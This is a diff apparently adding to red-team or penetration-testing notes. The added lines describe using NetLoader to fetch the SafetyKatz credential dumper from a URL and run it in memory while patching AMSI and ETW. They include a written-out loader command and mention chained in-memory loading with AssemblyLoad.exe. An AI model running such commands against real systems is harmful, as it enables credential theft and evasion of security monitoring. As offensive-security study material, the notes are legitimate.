@@ -633,3 +633,17 @@ $ Out-CompressedDll <Path to mimikatz.exe> > outputfilename.txt
 ![](https://i.imgur.com/FwiuSFo.png)
 
 
+
+
+- We can use NetLoader (https://github.com/Flangvik/NetLoader) to deliver our binary payloads.
+- It can be used to load binary from filepath or URL and patch AMSI & ETW while executing.
+
+
+```powershell
+$ C:\Users\Public\Loader.exe -path http://192.168.100.X/SafetyKatz.exe
+```
+
+
+- We also have AssemblyLoad.exe that can be used to load the Netloader in-memory from a URL which then loads a binary from a filepath or URL.
+
+
